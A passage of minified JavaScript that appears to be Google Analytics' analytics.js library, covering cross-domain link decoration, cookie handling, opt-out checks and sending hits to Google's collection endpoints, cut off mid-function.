! function () {
    var t, e, n, r = this || self,
        a = function (t, e) {
            t = t.split(".");
            var n, a = r;
            t[0] in a || void 0 === a.execScript || a.execScript("var " + t[0]);
            for (; t.length && (n = t.shift());) t.length || void 0 === e ? a = a[n] && a[n] !== Object.prototype[n] ? a[n] : a[n] = {} : a[n] = e
        },
        i = function (t, e) {
            for (var n in e) e.hasOwnProperty(n) && (t[n] = e[n])
        },
        o = function (t) {
            for (var e in t)
                if (t.hasOwnProperty(e)) return !0;
            return !1
        },
        s = /^(?:(?:https?|mailto|ftp):|[^:/?#]*(?:[/?#]|$))/i,
        c = {},
        u = function (t) {
            c.TAGGING = c.TAGGING || [], c.TAGGING[t] = !0
        },
        l = window,
        g = window.history,
        f = document,
        h = navigator,
        d = function (t, e) {
            f.addEventListener ? f.addEventListener(t, e, !1) : f.attachEvent && f.attachEvent("on" + t, e)
        },
        p = /:[0-9]+$/,
        v = function (t, e) {
            return e && (e = String(e).toLowerCase()), "protocol" !== e && "port" !== e || (t.protocol = w(t.protocol) || w(l.location.protocol)), "port" === e ? t.port = String(Number(t.hostname ? t.port : l.location.port) || ("http" === t.protocol ? 80 : "https" === t.protocol ? 443 : "")) : "host" === e && (t.hostname = (t.hostname || l.location.hostname).replace(p, "").toLowerCase()), m(t, e)
        },
        m = function (t, e, n) {
            var r = w(t.protocol);
            switch (e && (e = String(e).toLowerCase()), e) {
                case "url_no_fragment":
                    n = "", t && t.href && (n = 0 > (n = t.href.indexOf("#")) ? t.href : t.href.substr(0, n)), t = n;
                    break;
                case "protocol":
                    t = r;
                    break;
                case "host":
                    t = t.hostname.replace(p, "").toLowerCase(), n && (n = /^www\d*\./.exec(t)) && n[0] && (t = t.substr(n[0].length));
                    break;
                case "port":
                    t = String(Number(t.port) || ("http" === r ? 80 : "https" === r ? 443 : ""));
                    break;
                case "path":
                    t.pathname || t.hostname || u(1), t = (t = "/" === t.pathname.substr(0, 1) ? t.pathname : "/" + t.pathname).split("/"), 0 <= [].indexOf(t[t.length - 1]) && (t[t.length - 1] = ""), t = t.join("/");
                    break;
                case "query":
                    t = t.search.replace("?", "");
                    break;
                case "extension":
                    t = (t = 1 < (t = t.pathname.split(".")).length ? t[t.length - 1] : "").split("/")[0];
                    break;
                case "fragment":
                    t = t.hash.replace("#", "");
                    break;
                default:
                    t = t && t.href
            }
            return t
        },
        w = function (t) {
            return t ? t.replace(":", "").toLowerCase() : ""
        },
        _ = function (t) {
            var e = f.createElement("a");
            t && (e.href = t);
            var n = e.pathname;
            return "/" !== n[0] && (t || u(1), n = "/" + n), t = e.hostname.replace(p, ""), {
                href: e.href,
                protocol: e.protocol,
                host: e.host,
                hostname: t,
                pathname: n,
                search: e.search,
                hash: e.hash,
                port: e.port
            }
        };

    function b() {
        for (var e = t, n = {}, r = 0; r < e.length; ++r) n[e[r]] = r;
        return n
    }

    function y() {
        var t = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
        return (t += t.toLowerCase() + "0123456789-_") + "."
    }

    function k(n) {
        function r(t) {
            for (; i < n.length;) {
                var r = n.charAt(i++),
                    a = e[r];
                if (null != a) return a;
                if (!/^[\s\xa0]*$/.test(r)) throw Error("Unknown base64 encoding at char: " + r)
            }
            return t
        }
        t = t || y(), e = e || b();
        for (var a = "", i = 0; ;) {
            var o = r(-1),
                s = r(0),
                c = r(64),
                u = r(64);
            if (64 === u && -1 === o) return a;
            a += String.fromCharCode(o << 2 | s >> 4), 64 != c && (a += String.fromCharCode(s << 4 & 240 | c >> 2), 64 != u && (a += String.fromCharCode(c << 6 & 192 | u)))
        }
    }
    var x = function () {
        var t = U,
            e = q,
            n = S(),
            r = function (e) {
                t(e.target || e.srcElement || {})
            };
        if (!n.init) {
            d("mousedown", r), d("keyup", r), d("submit", (function (t) {
                e(t.target || t.srcElement || {})
            }));
            var a = HTMLFormElement.prototype.submit;
            HTMLFormElement.prototype.submit = function () {
                e(this), a.call(this)
            }, n.init = !0
        }
    },
        T = function (t, e, n, r, a) {
            t = {
                callback: t,
                domains: e,
                fragment: 2 === n,
                placement: n,
                forms: r,
                sameHost: a
            }, S().decorators.push(t)
        },
        O = function (t, e, n) {
            for (var r = S().decorators, a = {}, o = 0; o < r.length; ++o) {
                var s, c = r[o];
                if (s = !n || c.forms) t: {
                    s = c.domains;
                    var u = t,
                        l = !!c.sameHost;
                    if (s && (l || u !== f.location.hostname))
                        for (var g = 0; g < s.length; g++)
                            if (s[g] instanceof RegExp) {
                                if (s[g].test(u)) {
                                    s = !0;
                                    break t
                                }
                            } else if (0 <= u.indexOf(s[g]) || l && 0 <= s[g].indexOf(u)) {
                                s = !0;
                                break t
                            }
                    s = !1
                }
                s && (null == (s = c.placement) && (s = c.fragment ? 2 : 1), s === e && i(a, c.callback()))
            }
            return a
        };

    function S() {
        var t = {},
            e = l.google_tag_data;
        return l.google_tag_data = void 0 === e ? t : e, (e = (t = l.google_tag_data).gl) && e.decorators || (e = {
            decorators: []
        }, t.gl = e), e
    }
    var C = /(.*?)\*(.*?)\*(.*)/,
        A = /([^?#]+)(\?[^#]*)?(#.*)?/;

    function E(t) {
        return new RegExp("(.*?)(^|&)" + t + "=([^&]*)&?(.*)")
    }
    var N = function (n) {
        var r, a = [];
        for (r in n)
            if (n.hasOwnProperty(r)) {
                var i = n[r];
                if (void 0 !== i && i == i && null !== i && "[object Object]" !== i.toString()) {
                    a.push(r);
                    var o = a,
                        s = o.push;
                    i = String(i), t = t || y(), e = e || b();
                    for (var c = [], u = 0; u < i.length; u += 3) {
                        var l = u + 1 < i.length,
                            g = u + 2 < i.length,
                            f = i.charCodeAt(u),
                            h = l ? i.charCodeAt(u + 1) : 0,
                            d = g ? i.charCodeAt(u + 2) : 0,
                            p = f >> 2;
                        f = (3 & f) << 4 | h >> 4, h = (15 & h) << 2 | d >> 6, d &= 63, g || (d = 64, l || (h = 64)), c.push(t[p], t[f], t[h], t[d])
                    }
                    s.call(o, c.join(""))
                }
            } return ["1", j(n = a.join("*")), n].join("*")
    };

    function j(t, e) {
        if (t = [l.navigator.userAgent, (new Date).getTimezoneOffset(), h.userLanguage || h.language, Math.floor(new Date(Date.now()).getTime() / 60 / 1e3) - (void 0 === e ? 0 : e), t].join("*"), !(e = n)) {
            e = Array(256);
            for (var r = 0; 256 > r; r++) {
                for (var a = r, i = 0; 8 > i; i++) a = 1 & a ? a >>> 1 ^ 3988292384 : a >>> 1;
                e[r] = a
            }
        }
        for (n = e, e = 4294967295, r = 0; r < t.length; r++) e = e >>> 8 ^ n[255 & (e ^ t.charCodeAt(r))];
        return ((-1 ^ e) >>> 0).toString(36)
    }

    function R(t) {
        return function (e) {
            var n = _(l.location.href),
                r = n.search.replace("?", "");
            t: {
                for (var a = r.split("&"), i = 0; i < a.length; i++) {
                    var o = a[i].split("=");
                    if ("_gl" === decodeURIComponent(o[0]).replace(/\+/g, " ")) {
                        a = o.slice(1).join("=");
                        break t
                    }
                }
                a = void 0
            }
            e.query = L(a || "") || {}, i = (a = v(n, "fragment")).match(E("_gl")), e.fragment = L(i && i[3] || "") || {}, t && function (t, e, n) {
                function r(t, e) {
                    return (t = I("_gl", t)).length && (t = e + t), t
                }
                if (g && g.replaceState) {
                    var a = E("_gl");
                    (a.test(e) || a.test(n)) && (t = v(t, "path"), e = r(e, "?"), n = r(n, "#"), g.replaceState({}, void 0, "" + t + e + n))
                }
            }(n, r, a)
        }
    }

    function I(t, e) {
        if (t = E(t).exec(e)) {
            var n = t[2],
                r = t[4];
            e = t[1], r && (e = e + n + r)
        }
        return e
    }
    var L = function (t) {
        try {
            t: {
                if (t) {
                    e: {
                        for (var e = 0; 3 > e; ++e) {
                            var n = C.exec(t);
                            if (n) {
                                var r = n;
                                break e
                            }
                            t = decodeURIComponent(t)
                        }
                        r = void 0
                    }
                    if (r && "1" === r[1]) {
                        var a = r[2],
                            i = r[3];
                        e: {
                            for (r = 0; 3 > r; ++r)
                                if (a === j(i, r)) {
                                    var o = !0;
                                    break e
                                } o = !1
                        }
                        if (o) {
                            var s = i;
                            break t
                        }
                        u(7)
                    }
                }
                s = void 0
            }
            if (void 0 !== (a = s)) {
                s = {};
                var c = a ? a.split("*") : [];
                for (a = 0; a + 1 < c.length; a += 2) {
                    var l = c[a],
                        g = k(c[a + 1]);
                    s[l] = g
                }
                return u(6), s
            }
        }
        catch (t) {
            u(8)
        }
    };

    function P(t, e, n, r) {
        function a(e) {
            var n = (e = I(t, e)).charAt(e.length - 1);
            return e && "&" !== n && (e += "&"), e + s
        }
        r = void 0 !== r && r;
        var i = A.exec(n);
        if (!i) return "";
        n = i[1];
        var o = i[2] || "";
        i = i[3] || "";
        var s = t + "=" + e;
        return r ? i = "#" + a(i.substring(1)) : o = "?" + a(o.substring(1)), "" + n + o + i
    }

    function $(t, e) {
        var n = "FORM" === (t.tagName || "").toUpperCase(),
            r = O(e, 1, n),
            a = O(e, 2, n);
        for (var i in e = O(e, 3, n), o(r) && (r = N(r), n ? G("_gl", r, t) : D("_gl", r, t, !1)), !n && o(a) && D("_gl", n = N(a), t, !0), e) e.hasOwnProperty(i) && M(i, e[i], t)
    }

    function M(t, e, n, r) {
        if (n.tagName) {
            if ("a" === n.tagName.toLowerCase()) return D(t, e, n, r);
            if ("form" === n.tagName.toLowerCase()) return G(t, e, n)
        }
        if ("string" == typeof n) return P(t, e, n, r)
    }

    function D(t, e, n, r) {
        n.href && (t = P(t, e, n.href, void 0 !== r && r), s.test(t) && (n.href = t))
    }

    function G(t, e, n) {
        if (n && n.action) {
            var r = (n.method || "").toLowerCase();
            if ("get" === r) {
                r = n.childNodes || [];
                for (var a = !1, i = 0; i < r.length; i++) {
                    var o = r[i];
                    if (o.name === t) {
                        o.setAttribute("value", e), a = !0;
                        break
                    }
                }
                a || ((r = f.createElement("input")).setAttribute("type", "hidden"), r.setAttribute("name", t), r.setAttribute("value", e), n.appendChild(r))
            } else "post" === r && (t = P(t, e, n.action), s.test(t) && (n.action = t))
        }
    }

    function U(t) {
        try {
            t: {
                for (var e = 100; t && 0 < e;) {
                    if (t.href && t.nodeName.match(/^a(?:rea)?$/i)) {
                        var n = t;
                        break t
                    }
                    t = t.parentNode, e--
                }
                n = null
            }
            if (n) {
                var r = n.protocol;
                "http:" !== r && "https:" !== r || $(n, n.hostname)
            }
        }
        catch (t) { }
    }

    function q(t) {
        try {
            if (t.action) $(t, v(_(t.action), "host"))
        } catch (t) { }
    }
    a("google_tag_data.glBridge.auto", (function (t, e, n, r) {
        x(), T(t, e, "fragment" === n ? 2 : 1, !!r, !1)
    })), a("google_tag_data.glBridge.passthrough", (function (t, e, n) {
        x(), T(t, [m(l.location, "host", !0)], e, !!n, !0)
    })), a("google_tag_data.glBridge.decorate", (function (t, e, n) {
        return M("_gl", t = N(t), e, !!n)
    })), a("google_tag_data.glBridge.generate", N), a("google_tag_data.glBridge.get", (function (t, e) {
        var n = R(!!e);
        return (e = S()).data || (e.data = {
            query: {},
            fragment: {}
        }, n(e.data)), n = {}, (e = e.data) && (i(n, e.query), t && i(n, e.fragment)), n
    }))
}(window),
    function () {
        function t(t) {
            var e, n = 1;
            if (t)
                for (n = 0, e = t.length - 1; 0 <= e; e--) {
                    var r = t.charCodeAt(e);
                    n = 0 != (r = 266338304 & (n = (n << 6 & 268435455) + r + (r << 14))) ? n ^ r >> 21 : n
                }
            return n
        }
        var e = function (t) {
            this.C = t || []
        };
        e.prototype.set = function (t) {
            this.C[t] = !0
        }, e.prototype.encode = function () {
            for (var t = [], e = 0; e < this.C.length; e++) this.C[e] && (t[Math.floor(e / 6)] ^= 1 << e % 6);
            for (e = 0; e < t.length; e++) t[e] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_".charAt(t[e] || 0);
            return t.join("") + "~"
        };
        var n, r, a = window.GoogleAnalyticsObject;
        if ((n = null != a) && (n = -1 < (a.constructor + "").indexOf("String")), r = n) {
            var i = window.GoogleAnalyticsObject;
            r = i ? i.replace(/^[\s\xa0]+|[\s\xa0]+$/g, "") : ""
        }
        var o = r || "ga",
            s = /^(?:utma\.)?\d+\.\d+$/,
            c = /^amp-[\w.-]{22,64}$/,
            u = !1,
            l = new e;

        function g(t) {
            l.set(t)
        }
        var f = function (t) {
            t = h(t), t = new e(t);
            for (var n = l.C.slice(), r = 0; r < t.C.length; r++) n[r] = n[r] || t.C[r];
            return new e(n).encode()
        },
            h = function (t) {
                return t = t.get(We), p(t) || (t = []), t
            },
            d = function (t) {
                return "function" == typeof t
            },
            p = function (t) {
                return "[object Array]" == Object.prototype.toString.call(Object(t))
            },
            v = function (t) {
                return null != t && -1 < (t.constructor + "").indexOf("String")
            },
            m = function (t, e) {
                return 0 == t.indexOf(e)
            },
            w = function () {
                for (var e = I.navigator.userAgent + (L.cookie ? L.cookie : "") + (L.referrer ? L.referrer : ""), n = e.length, r = I.history.length; 0 < r;) e += r-- ^ n++;
                return [Rt() ^ 2147483647 & t(e), Math.round((new Date).getTime() / 1e3)].join(".")
            },
            _ = function () { },
            b = function (t) {
                return encodeURIComponent instanceof Function ? encodeURIComponent(t) : (g(28), t)
            },
            y = function (t, e, n, r) {
                try {
                    t.addEventListener ? t.addEventListener(e, n, !!r) : t.attachEvent && t.attachEvent("on" + e, n)
                } catch (t) {
                    g(27)
                }
            },
            k = /^[\w\-:/.?=&%!\[\]]+$/,
            x = /^[\w+/_-]+[=]{0,2}$/,
            T = null,
            O = function (t, e, n, r, a) {
                if (!T) {
                    T = {
                        createScriptURL: function (t) {
                            return t
                        },
                        createHTML: function (t) {
                            return t
                        }
                    };
                    try {
                        T = window.trustedTypes.createPolicy("google-analytics", T)
                    } catch (t) { }
                }
                if (t) {
                    var i = L.querySelector && L.querySelector("script[nonce]") || null;
                    i = i && (i.nonce || i.getAttribute && i.getAttribute("nonce")) || "", n ? (a = r = "", e && k.test(e) && (r = ' id="' + e + '"'), i && x.test(i) && (a = ' nonce="' + i + '"'), k.test(t) && L.write(T.createHTML("<script" + r + a + ' src="' + t + '"><\/script>'))) : ((n = L.createElement("script")).type = "text/javascript", n.async = !0, n.src = T.createScriptURL(t), r && (n.onload = r), a && (n.onerror = a), e && (n.id = e), i && n.setAttribute("nonce", i), (t = L.getElementsByTagName("script")[0]).parentNode.insertBefore(n, t))
                }
            },
            S = function (t, e) {
                return C(L.location[e ? "href" : "search"], t)
            },
            C = function (t, e) {
                return (t = t.match("(?:&|#|\\?)" + b(e).replace(/([.*+?^=!:${}()|\[\]\/\\])/g, "\\$1") + "=([^&#]*)")) && 2 == t.length ? t[1] : ""
            },
            A = function () {
                var t = "" + L.location.hostname;
                return 0 == t.indexOf("www.") ? t.substring(4) : t
            },
            E = function (t, e) {
                var n = t.indexOf(e);
                return (5 == n || 6 == n) && ("/" == (t = t.charAt(n + e.length)) || "?" == t || "" == t || ":" == t)
            },
            N = function (t, e) {
                if (1 == e.length && null != e[0] && "object" == typeof e[0]) return e[0];
                for (var n = {}, r = Math.min(t.length + 1, e.length), a = 0; a < r; a++) {
                    if ("object" == typeof e[a]) {
                        for (var i in e[a]) e[a].hasOwnProperty(i) && (n[i] = e[a][i]);
                        break
                    }
                    a < t.length && (n[t[a]] = e[a])
                }
                return n
            },
            j = function (t, e) {
                for (var n = 0; n < t.length; n++)
                    if (e == t[n]) return !0;
                return !1
            },
            R = function () {
                this.oa = [], this.ea = {}, this.m = {}
            };
        R.prototype.set = function (t, e, n) {
            this.oa.push(t), n ? this.m[":" + t] = e : this.ea[":" + t] = e
        }, R.prototype.get = function (t) {
            return this.m.hasOwnProperty(":" + t) ? this.m[":" + t] : this.ea[":" + t]
        }, R.prototype.map = function (t) {
            for (var e = 0; e < this.oa.length; e++) {
                var n = this.oa[e],
                    r = this.get(n);
                r && t(n, r)
            }
        };
        var I = window,
            L = document,
            P = document.currentScript ? document.currentScript.src : "",
            $ = function (t, e) {
                return setTimeout(t, e)
            },
            M = window,
            D = document,
            G = function (t) {
                var e = M._gaUserPrefs;
                if (e && e.ioo && e.ioo() || t && !0 === M["ga-disable-" + t]) return !0;
                try {
                    var n = M.external;
                    if (n && n._gaUserPrefs && "oo" == n._gaUserPrefs) return !0
                } catch (t) { }
                for (t = [], e = String(D.cookie).split(";"), n = 0; n < e.length; n++) {
                    var r = e[n].split("="),
                        a = r[0].replace(/^\s*|\s*$/g, "");
                    a && "AMP_TOKEN" == a && ((r = r.slice(1).join("=").replace(/^\s*|\s*$/g, "")) && (r = decodeURIComponent(r)), t.push(r))
                }
                for (e = 0; e < t.length; e++)
                    if ("$OPT_OUT" == t[e]) return !0;
                return !!D.getElementById("__gaOptOutExtension")
            },
            U = function (t) {
                var e = [],
                    n = L.cookie.split(";");
                t = new RegExp("^\\s*" + t + "=\\s*(.*?)\\s*$");
                for (var r = 0; r < n.length; r++) {
                    var a = n[r].match(t);
                    a && e.push(a[1])
                }
                return e
            },
            q = function (t, e, n, r, a, i, o) {
                if (!(a = !G(a) && !(V.test(L.location.hostname) || "/" == n && H.test(r)))) return !1;
                if (e && 1200 < e.length && (e = e.substring(0, 1200)), n = t + "=" + e + "; path=" + n + "; ", i && (n += "expires=" + new Date((new Date).getTime() + i).toGMTString() + "; "), r && "none" !== r && (n += "domain=" + r + ";"), o && (n += o + ";"), r = L.cookie, L.cookie = n, !(r = r != L.cookie)) t: {
                    for (t = U(t), r = 0; r < t.length; r++)
                        if (e == t[r]) {
                            r = !0;
                            break t
                        } r = !1
                }
                return r
            },
            F = function (t) {
                return encodeURIComponent ? encodeURIComponent(t).replace(/\(/g, "%28").replace(/\)/g, "%29") : t
            },
            H = /^(www\.)?google(\.com?)?(\.[a-z]{2})?$/,
            V = /(^|\.)doubleclick\.net$/i;

        function B(t, e, n) {
            e = function (t) {
                var e = [],
                    n = L.cookie.split(";");
                t = new RegExp("^\\s*" + (t || "_gac") + "_(UA-\\d+-\\d+)=\\s*(.+?)\\s*$");
                for (var r = 0; r < n.length; r++) {
                    var a = n[r].match(t);
                    a && e.push({
                        ja: a[1],
                        value: a[2],
                        timestamp: Number(a[2].split(".")[1]) || 0
                    })
                }
                return e.sort((function (t, e) {
                    return e.timestamp - t.timestamp
                })), e
            }(e);
            var r = {};
            if (!e || !e.length) return r;
            for (var a = 0; a < e.length; a++) {
                var i = e[a].value.split(".");
                if ("1" !== i[0] || n && 3 > i.length || !n && 3 !== i.length) t && (t.na = !0);
                else if (Number(i[1])) {
                    r[e[a].ja] ? t && (t.pa = !0) : r[e[a].ja] = [];
                    var o = {
                        version: i[0],
                        timestamp: 1e3 * Number(i[1]),
                        qa: i[2]
                    };
                    n && 3 < i.length && (o.labels = i.slice(3)), r[e[a].ja].push(o)
                }
            }
            return r
        }
        var z, K, X, W, Z = /^https?:\/\/[^/]*cdn\.ampproject\.org\//,
            Y = /^(?:www\.|m\.|amp\.)+/,
            J = [],
            Q = function (t) {
                if (ot(t[Dn])) {
                    var e;
                    if (void 0 === W) (e = (e = Ir.get()) && e._ga || void 0) && (W = e, g(81));
                    if (void 0 !== W) return t[mn] || (t[mn] = W), !1
                }
                if (t[Dn]) {
                    if (g(67), t[Nn] && "cookie" != t[Nn]) return !1;
                    if (void 0 !== W) t[mn] || (t[mn] = W);
                    else {
                        t: {
                            e = String(t[xn] || A());
                            var n = String(t[Tn] || "/"),
                                r = U(String(t[kn] || "_ga"));
                            if (!(e = kr(r, e, n)) || s.test(e)) e = !0;
                            else if (0 == (e = U("AMP_TOKEN")).length) e = !0;
                            else {
                                if (1 == e.length && ("$RETRIEVING" == (e = decodeURIComponent(e[0])) || "$OPT_OUT" == e || "$ERROR" == e || "$NOT_FOUND" == e)) {
                                    e = !0;
                                    break t
                                }
                                e = !1
                            }
                        }
                        if (e && et(tt, String(t[yn]))) return !0
                    }
                }
                return !1
            },
            tt = function () {
                ja.D([_])
            },
            et = function (t, e) {
                var n = U("AMP_TOKEN");
                return 1 < n.length ? (g(55), !1) : "$OPT_OUT" == (n = decodeURIComponent(n[0] || "")) || "$ERROR" == n || G(e) ? (g(62), !1) : Z.test(L.referrer) || "$NOT_FOUND" != n ? void 0 !== W ? (g(56), $((function () {
                    t(W)
                }), 0), !0) : z ? (J.push(t), !0) : "$RETRIEVING" == n ? (g(57), $((function () {
                    et(t, e)
                }), 1e4), !0) : (z = !0, n && "$" != n[0] || (at("$RETRIEVING", 3e4), setTimeout(rt, 3e4), n = ""), !!nt(n, e) && (J.push(t), !0)) : (g(68), !1)
            },
            nt = function (t, e, n) {
                if (!window.JSON) return g(58), !1;
                var r = I.XMLHttpRequest;
                if (!r) return g(59), !1;
                var a = new r;
                return "withCredentials" in a ? (a.open("POST", (n || "https://ampcid.google.com/v1/publisher:getClientId") + "?key=AIzaSyA65lEHUEizIsNtlbNo-l2K18dT680nsaM", !0), a.withCredentials = !0, a.setRequestHeader("Content-Type", "text/plain"), a.onload = function () {
                    if (z = !1, 4 == a.readyState) {
                        try {
                            200 != a.status && (g(61), it("", "$ERROR", 3e4));
                            var r = JSON.parse(a.responseText);
                            r.optOut ? (g(63), it("", "$OPT_OUT", 31536e6)) : r.clientId ? it(r.clientId, r.securityToken, 31536e6) : !n && r.alternateUrl ? (K && clearTimeout(K), z = !0, nt(t, e, r.alternateUrl)) : (g(64), it("", "$NOT_FOUND", 36e5))
                        } catch (t) {
                            g(65), it("", "$ERROR", 3e4)
                        }
                        a = null
                    }
                }, r = {
                    originScope: "AMP_ECID_GOOGLE"
                }, t && (r.securityToken = t), a.send(JSON.stringify(r)), K = $((function () {
                    g(66), it("", "$ERROR", 3e4)
                }), 1e4), !0) : (g(60), !1)
            },
            rt = function () {
                z = !1
            },
            at = function (t, e) {
                if (void 0 === X) {
                    X = "";
                    for (var n = Or(), r = 0; r < n.length; r++) {
                        var a = n[r];
                        if (q("AMP_TOKEN", encodeURIComponent(t), "/", a, "", e)) return void (X = a)
                    }
                }
                q("AMP_TOKEN", encodeURIComponent(t), "/", X, "", e)
            },
            it = function (t, e, n) {
                for (K && clearTimeout(K), e && at(e, n), W = t, e = J, J = [], n = 0; n < e.length; n++) e[n](t)
            },
            ot = function (t) {
                t: {
                    if (Z.test(L.referrer)) {
                        var e = L.location.hostname.replace(Y, "");
                        e: {
                            var n = L.referrer,
                                r = (n = n.replace(/^https?:\/\//, "")).replace(/^[^/]+/, "").split("/"),
                                a = r[2];
                            if (!(r = (r = "s" == a ? r[3] : a) ? decodeURIComponent(r) : r)) {
                                if (0 == n.indexOf("xn--")) {
                                    n = "";
                                    break e
                                } (n = n.match(/(.*)\.cdn\.ampproject\.org\/?$/)) && 2 == n.length && (r = n[1].replace(/-/g, ".").replace(/\.\./g, "-"))
                            }
                            n = r ? r.replace(Y, "") : ""
                        }
                        if ((r = e === n) || (n = "." + n, r = e.substring(e.length - n.length, e.length) === n), r) {
                            e = !0;
                            break t
                        }
                        g(78)
                    }
                    e = !1
                }
                return e && !1 !== t
            },
            st = function (t) {
                return (t || u || "https:" == L.location.protocol ? "https:" : "http:") + "//www.google-analytics.com"
            },
            ct = function (t) {
                switch (t) {
                    default:
                    case 1:
                        return "https://www.google-analytics.com/gtm/js?id=";
                    case 2:
                        return "https://www.googletagmanager.com/gtag/js?id="
                }
            },
            ut = function (t) {
                this.name = "len", this.message = t + "-8192"
            },
            lt = function (t, e, n) {
                if (n = n || _, 2036 >= e.length) ft(t, e, n);
                else {
                    if (!(8192 >= e.length)) throw mt("len", e.length), new ut(e.length);
                    vt(t, e, n) || ht(t, e, n) || ft(t, e, n)
                }
            },
            gt = function (t, e, n, r) {
                ht(t + "?" + e, "", r = r || _, n)
            },
            ft = function (t, e, n) {
                var r = function (t) {
                    var e = L.createElement("img");
                    return e.width = 1, e.height = 1, e.src = t, e
                }(t + "?" + e);
                r.onload = r.onerror = function () {
                    r.onload = null, r.onerror = null, n()
                }
            },
            ht = function (t, e, n, r) {
                var a = I.XMLHttpRequest;
                if (!a) return !1;
                var i = new a;
                return "withCredentials" in i && (t = t.replace(/^http:/, "https:"), i.open("POST", t, !0), i.withCredentials = !0, i.setRequestHeader("Content-Type", "text/plain"), i.onreadystatechange = function () {
                    if (4 == i.readyState) {
                        if (r && "text/plain" === i.getResponseHeader("Content-Type")) try {
                            dt(r, i.responseText, n)
                        } catch (t) {
                            mt("xhr", "rsp"), n()
                        } else n();
                        i = null
                    }
                }, i.send(e), !0)
            },
            dt = function (t, e, n) {
                if (1 > e.length) mt("xhr", "ver", "0"), n();
                else if (3 < t.count++) mt("xhr", "tmr", "" + t.count), n();
                else {
                    var r = e.charAt(0);
                    if ("1" === r) pt(t, e.substring(1), n);
                    else if (t.V && "2" === r) {
                        var a = e.substring(1).split(","),
                            i = 0;
                        for (e = function () {
                            ++i === a.length && n()
                        }, r = 0; r < a.length; r++) pt(t, a[r], e)
                    } else mt("xhr", "ver", String(e.length)), n()
                }
            },
            pt = function (t, e, n) {
                if (0 === e.length) n();
                else {
                    var r = e.charAt(0);
                    switch (r) {
                        case "d":
                            gt("https://stats.g.doubleclick.net/j/collect", t.U, t, n);
                            break;
                        case "g":
                            ft("https://www.google.com/ads/ga-audiences", t.google, n), (e = e.substring(1)) && (/^[a-z.]{1,6}$/.test(e) ? ft("https://www.google.%/ads/ga-audiences".replace("%", e), t.google, _) : mt("tld", "bcc", e));
                            break;
                        case "G":
                            if (t.V) {
                                t.V("G-" + e.substring(1)), n();
                                break
                            }
                        case "x":
                            if (t.V) {
                                t.V(), n();
                                break
                            }
                        default:
                            mt("xhr", "brc", r), n()
                    }
                }
            },
            vt = function (t, e, n) {
                return !!I.navigator.sendBeacon && (!!I.navigator.sendBeacon(t, e) && (n(), !0))
            },
            mt = function (t, e, n) {
                1 <= 100 * Math.random() || G("?") || (t = ["t=error", "_e=" + t, "_v=j98", "sr=1"], e && t.push("_f=" + e), n && t.push("_m=" + b(n.substring(0, 100))), t.push("aip=1"), t.push("z=" + Rt()), ft(st(!0) + "/u/d", t.join("&"), _))
            },
            wt = function () {
                return I.gaData = I.gaData || {}
            },
            _t = function (t) {
                var e = wt();
                return e[t] = e[t] || {}
            },
            bt = function () {
                this.M = []
            };

        function yt(e) {
            if (100 != e.get(In) && t($t(e, mn)) % 1e4 >= 100 * Mt(e, In)) throw "abort"
        }

        function kt(t) {
            if (G($t(t, yn))) throw "abort"
        }

        function xt() {
            var t = L.location.protocol;
            if ("http:" != t && "https:" != t) throw "abort"
        }

        function Tt(t) {
            try {
                I.navigator.sendBeacon ? g(42) : I.XMLHttpRequest && "withCredentials" in new I.XMLHttpRequest && g(40)
            } catch (t) { }
            t.set(Xe, f(t), !0), t.set(ae, Mt(t, ae) + 1);
            var e = [];
            Ft.map((function (n, r) {
                r.F && (null != (n = t.get(n)) && n != r.defaultValue && ("boolean" == typeof n && (n *= 1), e.push(r.F + "=" + b("" + n))))
            })), !1 === t.get(ir) && e.push("npa=1"), e.push("z=" + It()), t.set(ee, e.join("&"), !0)
        }

        function Ot(t) {
            var e = $t(t, re);
            !e && t.get(ne) && (e = "beacon");
            var n = $t(t, Qn),
                r = $t(t, Vn),
                a = n || (r || st(!1) + "") + "/collect";
            switch ($t(t, rr)) {
                case "d":
                    a = n || (r || st(!1) + "") + "/j/collect", e = t.get(nr) || void 0, gt(a, $t(t, ee), e, t.Z(te));
                    break;
                default:
                    e ? (n = $t(t, ee), r = (r = t.Z(te)) || _, "image" == e ? ft(a, n, r) : "xhr" == e && ht(a, n, r) || "beacon" == e && vt(a, n, r) || lt(a, n, r)) : lt(a, $t(t, ee), t.Z(te))
            }
            a = $t(t, yn), e = (a = _t(a)).hitcount, a.hitcount = e ? e + 1 : 1, a.first_hit || (a.first_hit = (new Date).getTime()), a = $t(t, yn), delete _t(a).pending_experiments, t.set(te, _, !0)
        }

        function St(t) {
            wt().expId && t.set(De, wt().expId), wt().expVar && t.set(Ge, wt().expVar);
            var e = $t(t, yn);
            if (e = _t(e).pending_experiments) {
                var n = [];
                for (r in e) e.hasOwnProperty(r) && e[r] && n.push(encodeURIComponent(r) + "." + encodeURIComponent(e[r]));
                var r = n.join("!")
            } else r = void 0;
            r && ((e = t.get(Ue)) && (r = e + "!" + r), t.set(Ue, r, !0))
        }

        function Ct() {
            if (I.navigator && "preview" == I.navigator.loadPurpose) throw "abort"
        }

        function At(t) {
            var e = I.gaDevIds || [];
            if (p(e)) {
                var n = t.get("&did");
                v(n) && 0 < n.length && (e = e.concat(n.split(","))), n = [];
                for (var r = 0; r < e.length; r++) j(n, e[r]) || n.push(e[r]);
                0 != n.length && t.set("&did", n.join(","), !0)
            }
        }

        function Et(t) {
            if (!t.get(yn)) throw "abort"
        }

        function Nt(t) {
            try {
                if (!t.get(Wn) && (t.set(Wn, !0), !t.get("&gtm"))) {
                    var e = void 0;
                    if (jt(S("gtm_debug")) && (e = 2), !e && m(L.referrer, "https://tagassistant.google.com/") && (e = 3), !e && j(L.cookie.split("; "), "__TAG_ASSISTANT=x") && (e = 4), !e) jt(L.documentElement.getAttribute("data-tag-assistant-present")) && (e = 5);
                    if (e) {
                        I["google.tagmanager.debugui2.queue"] || (I["google.tagmanager.debugui2.queue"] = [], O("https://www.google-analytics.com/debug/bootstrap?id=" + t.get(yn) + "&src=LEGACY&cond=" + e));
                        var n = L.currentScript;
                        I["google.tagmanager.debugui2.queue"].push({
                            messageType: "LEGACY_CONTAINER_STARTING",
                            data: {
                                id: t.get(yn),
                                scriptSource: n && n.src || ""
                            }
                        })
                    }
                }
            } catch (t) { }
        }

        function jt(t) {
            if (null == t || 0 === t.length) return !1;
            t = Number(t);
            var e = Date.now();
            return t < e + 3e5 && t > e - 9e5
        }
        bt.prototype.add = function (t) {
            this.M.push(t)
        }, bt.prototype.D = function (t) {
            try {
